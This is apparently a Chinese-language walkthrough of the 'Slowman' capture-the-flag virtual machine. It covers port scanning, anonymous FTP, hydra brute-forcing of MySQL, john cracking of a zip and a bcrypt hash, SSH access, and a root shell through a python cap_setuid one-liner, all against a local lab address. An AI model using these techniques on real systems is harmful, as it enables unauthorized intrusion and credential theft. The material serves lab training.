# Slowman

:::note

[Linux VM] [Tested on VirtualBox] created by || Pylon

⏲️ Release Date // 2023-12-04

✔️ MD5 // 6a4ad8842487288bd6d076fb6e19d3ce

☠ Root // 53

💀 User // 50

📝Notes //
Enjoy it :)

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.104
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.104
Host is up (0.00048s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)
|_  256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)
80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Fastgym
3306/tcp open   mysql    MySQL 8.0.35-0ubuntu0.22.04.1
| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate
| Not valid before: 2023-11-22T19:44:52
|_Not valid after:  2033-11-19T19:44:52
| mysql-info:
|   Protocol: 10
|   Version: 8.0.35-0ubuntu0.22.04.1
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsTransactions, LongPassword, IgnoreSigpipes, Speaks41ProtocolOld, Support41Auth, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ODBCClient, SupportsLoadDataLocal, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: I-h4^y\x01\x11w8~FvG\x02cPh7F
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
```

## ftp Anonymous

尝试匿名登录，列出共享目录

```plaintext
ftp> ls -lh
150 Here comes the directory listing.
-rw-r--r--    1 0        0              12 Nov 22 21:46 allowedusersmysql.txt
226 Directory send OK.
```

查看文件内容

```plaintext title="allowedusersmysql.txt"
trainerjeff
```

根据文件名猜测，是 mysql 允许连接的用户名

## mysql 远程连接

尝试使用 hydra 爆破用户密码

```plaintext
[3306][mysql] host: 192.168.56.104   login: trainerjeff   password: soccer1
```

使用爆破出来的凭据进行连接数据库，查看基本信息

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| trainers_db        |
+--------------------+

MySQL [trainers_db]> show tables;
+-----------------------+
| Tables_in_trainers_db |
+-----------------------+
| users                 |
+-----------------------+

MySQL [trainers_db]> select * from users;
+----+-----------------+-------------------------------+
| id | user            | password                      |
+----+-----------------+-------------------------------+
|  1 | gonzalo         | tH1sS2stH3g0nz4l0pAsSWW0rDD!! |
|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |
+----+-----------------+-------------------------------+
```

## web 服务

尝试进行目录爆破

```plaintext
[12:18:58] 200 -    5KB - /contact.html
[12:19:05] 200 -    5KB - /images/
[12:19:05] 200 -   16KB - /index.html
[12:19:06] 200 -    1KB - /js/
```

经过简单判断，都是静态资源，没有敏感文件

尝试使用数据库中得到的信息登陆后台，得到

```plaintext
http://192.168.56.104/secretgym/serverSHARE/credentials.zip
```

下载下来进行分析，发现带有密码保护，尝试破解

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (credentials.zip/passwords.txt)
1g 0:00:00:00 DONE (2024-02-12 12:49) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

得到以下信息

```plaintext title="credentials.zip/passwords.txt"
----------
$USERS: trainerjean

$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq
----------
```

将得到的哈希值继续进行爆破

```plaintext
┌─[randark@parrot]─[~/tmp]
└──╼ $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tweety1          (?)
```

## User - trainerjean

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs trainerjean@192.168.56.104
[12:53:41] Welcome to pwncat 🐈!
Password: *******
[12:53:48] 192.168.56.104:22: registered new host w/ db
(local) pwncat$ back
(remote) trainerjean@slowman:/home/trainerjean$ whoami
trainerjean
```

### flag - user

```bash
(remote) trainerjean@slowman:/home/trainerjean$ cat user.txt
YOU9et7HEpA$SwordofS10wMan!!
```

### 尝试提权

```plaintext title="getcap -r / 2>/dev/null"
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
/snap/core20/1974/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

发现 python 可以利用 cap_setuid 实现提权

```bash
(remote) trainerjean@slowman:/home/trainerjean$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
[](remote)[] []root@slowman[]:[]/home/trainerjean[]$ whoami
root
```

## User - root

### flag - root

```bash
[](remote)[] []root@slowman[]:[]/root[]$ cat root.txt
Y0UGE23t7hE515roo7664pa5$WoRDOFSlowmaN!!
```
